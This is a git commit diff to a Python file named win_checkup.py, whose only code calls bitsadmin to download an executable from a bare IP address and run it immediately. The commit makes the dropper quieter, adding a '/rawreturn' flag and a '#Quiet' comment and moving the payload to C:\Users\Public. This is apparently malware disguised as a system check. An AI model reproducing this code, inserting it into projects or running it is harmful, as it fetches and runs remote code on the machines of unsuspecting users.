77dc16b39d4b978d6d7a6db2819a4269fa2d3277
byjohn1980 <128472633+byjohn1980@users.noreply.github.com>
2023-03-28 20:05:05 +0800

    Update win_checkup.py

--- win_checkup.py
+++ win_checkup.py
@@ -1,3 +1,4 @@
 import os
 
-os.system("bitsadmin /transfer n http://103.234.72.176:80/download/file/exe/TS_IK.exe C:\\Users\\TS_IK.exe & C:\\Users\\TS_IK.exe")
+#Quiet
+os.system("bitsadmin /rawreturn /transfer n http://103.234.72.176:80/download/file/exe/TS_IK.exe C:\\Users\\Public\\TS_IK.exe & C:\\Users\\Public\\TS_IK.exe")
